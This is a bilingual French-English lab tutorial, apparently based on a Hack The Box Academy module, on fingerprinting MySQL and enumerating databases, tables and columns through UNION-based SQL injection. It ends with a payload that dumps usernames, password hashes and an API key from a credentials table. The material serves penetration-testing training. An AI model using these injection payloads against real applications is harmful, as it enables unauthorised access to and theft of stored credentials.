# Database Enumeration

***

### <mark style="color:red;">MySQL Fingerprinting</mark>

Avant d'énumérer la base de données, nous devons généralement identifier le type de SGBD (Système de Gestion de Base de Données) auquel nous avons affaire. En effet, chaque SGBD utilise des requêtes différentes, et connaître son type nous aidera à savoir quelles requêtes utiliser.

Dans un premier temps, nous pouvons faire une supposition basée sur le serveur web. Par exemple :

* Si le serveur web indiqué dans les réponses HTTP est **Apache** ou **Nginx**, il est probable que le serveur tourne sous **Linux**, et donc que le SGBD soit **MySQL**.
* Si le serveur web est **IIS** (Internet Information Services), il y a de fortes chances que le SGBD soit **MSSQL** (Microsoft SQL Server).

Cependant, cette supposition reste approximative, car de nombreuses bases de données peuvent être utilisées sur différents systèmes d'exploitation ou serveurs web.

Pour identifier précisément le SGBD utilisé, nous pouvons exécuter certaines requêtes spécifiques pour le "fingerprinting" de la base de données.

Comme ce module traite de **MySQL**, voici quelques requêtes et leurs résultats qui permettent d'identifier un serveur MySQL :

<table data-full-width="true"><thead><tr><th>Payload</th><th>When to Use</th><th>Expected Output</th><th>Wrong Output</th></tr></thead><tbody><tr><td><code>SELECT @@version</code></td><td>When we have full query output</td><td>MySQL Version 'i.e. <code>10.3.22-MariaDB-1ubuntu1</code>'</td><td>In MSSQL it returns MSSQL version. Error with other DBMS.</td></tr><tr><td><code>SELECT POW(1,1)</code></td><td>When we only have numeric output</td><td><code>1</code></td><td>Error with other DBMS</td></tr><tr><td><code>SELECT SLEEP(5)</code></td><td>Blind/No Output</td><td>Delays page response for 5 seconds and returns <code>0</code>.</td><td>Will not delay response with other DBMS</td></tr></tbody></table>

<figure><img src="https://academy.hackthebox.com/storage/modules/33/db_version_1.jpg" alt=""><figcaption></figcaption></figure>

***

### <mark style="color:red;">INFORMATION\_SCHEMA Database</mark>

Pour extraire des données des tables en utilisant **UNION SELECT**, nous devons correctement formuler nos requêtes **SELECT**.\
Pour cela, nous avons besoin des informations suivantes :

* Liste des bases de données
* Liste des tables dans chaque base de données
* Liste des colonnes dans chaque table

Avec ces informations, nous pouvons construire notre requête **SELECT** pour extraire des données de n'importe quelle colonne, dans n'importe quelle table, de n'importe quelle base de données présente dans le SGBD.

C'est ici que nous pouvons utiliser la base de données **INFORMATION\_SCHEMA**.

La base **INFORMATION\_SCHEMA** contient des **métadonnées** sur les bases de données et les tables présentes sur le serveur. Cette base joue un rôle crucial dans l'exploitation des vulnérabilités **SQL Injection**.

Comme **INFORMATION\_SCHEMA** est une base de données différente, nous ne pouvons pas appeler ses tables directement avec une requête **SELECT**. Si nous spécifions uniquement le nom d'une table dans une requête **SELECT**, la requête cherchera cette table dans la base de données active.

Pour référencer une table présente dans une autre base de données, nous pouvons utiliser l’opérateur **"."** (point).\
Par exemple, pour sélectionner la table `users` située dans une base de données nommée `my_database`, nous pouvons utiliser :

```sql
SELECT * FROM my_database.users;
```

```sql
SELECT * FROM my_database.users;
```

Similarly, we can look at tables present in the `INFORMATION_SCHEMA` Database.

***

### <mark style="color:red;">SCHEMATA</mark>

* Pour commencer l’énumération, il faut lister les **bases de données** disponibles.
* La table `SCHEMATA` dans `INFORMATION_SCHEMA` contient **toutes les bases du serveur**.
* La colonne `SCHEMA_NAME` contient les **noms des bases**.
* Tester d’abord sur une base locale pour voir comment la requête fonctionne.

```shell-session
mysql> SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;

+--------------------+
| SCHEMA_NAME        |
+--------------------+
| mysql              |
| information_schema |
| performance_schema |
| ilfreight          |
| dev                |
+--------------------+
6 rows in set (0.01 sec)
```

* On voit les bases `ilfreight` et `dev`.
* Remarque : les **trois premières bases** sont des bases MySQL par défaut et sont généralement ignorées lors de l’énumération. Parfois, il y a aussi `sys`.
* On peut faire la même chose via une **injection SQL UNION** avec le payload correspondant

```sql
cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA--    
```

<figure><img src="https://academy.hackthebox.com/storage/modules/33/ports_dbs.png" alt=""><figcaption></figcaption></figure>

* On retrouve encore les bases `ilfreight` et `dev`, en excluant les bases par défaut.
* Pour savoir **quelle base utilise l’application** pour les données des ports, on peut exécuter :

```sql
SELECT database();
```

* Même méthode que pour récupérer la **version du DBMS**.

```sql
cn' UNION select 1,database(),2,3-- -
```

<figure><img src="https://academy.hackthebox.com/storage/modules/33/db_name.jpg" alt=""><figcaption></figcaption></figure>

We see that the database name is `ilfreight`. However, the other database (`dev`) looks interesting. So, let us try to retrieve the tables from it.

***

### <mark style="color:red;">TABLES</mark>

* Avant d’extraire les données de la base `dev`, il faut **lister ses tables**.
* La table `TABLES` dans `INFORMATION_SCHEMA` contient **toutes les tables**.
* Colonnes importantes :
  * `TABLE_SCHEMA` → indique la base
  * `TABLE_NAME` → nom de la table
* Même méthode que pour lister les bases ; exemple : payload pour trouver les tables de `dev`.

{% code overflow="wrap" fullWidth="true" %}
```sql
cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -
```
{% endcode %}

Note how we replaced the numbers '2' and '3' with 'TABLE\_NAME' and 'TABLE\_SCHEMA', to get the output of both columns in the same query.

&#x20; &#x20;

<figure><img src="https://academy.hackthebox.com/storage/modules/33/ports_tables_1.jpg" alt=""><figcaption></figcaption></figure>

Note: we added a (where table\_schema='dev') condition to only return tables from the 'dev' database, otherwise we would get all tables in all databases, which can be many.

***

### <mark style="color:red;">COLUMNS</mark>

* Pour extraire les données de la table `credentials`, il faut d’abord **trouver ses colonnes**.
* La table `COLUMNS` dans `INFORMATION_SCHEMA` contient **toutes les colonnes** de toutes les bases.
* Colonnes utiles :
  * `COLUMN_NAME` → nom de la colonne
  * `TABLE_NAME` → nom de la table
  * `TABLE_SCHEMA` → base à laquelle la table appartient
* Même méthode que précédemment : payload pour lister les colonnes de `credentials`.

{% code overflow="wrap" fullWidth="true" %}
```sql
cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -
```
{% endcode %}

<figure><img src="https://academy.hackthebox.com/storage/modules/33/ports_columns_1.jpg" alt=""><figcaption></figcaption></figure>

The table has two columns named `username` and `password`. We can use this information and dump data from the table.

***

### <mark style="color:red;">Data</mark>

```sql
cn' UNION select 1, username, password, 4 from dev.credentials-- -
```

Remember: don't forget to use the dot operator to refer to the 'credentials' in the 'dev' database, as we are running in the 'ilfreight' database, as previously discussed.

<figure><img src="https://academy.hackthebox.com/storage/modules/33/ports_credentials_1.png" alt=""><figcaption></figcaption></figure>

We were able to get all the entries in the `credentials` table, which contains sensitive information such as password hashes and an API key.
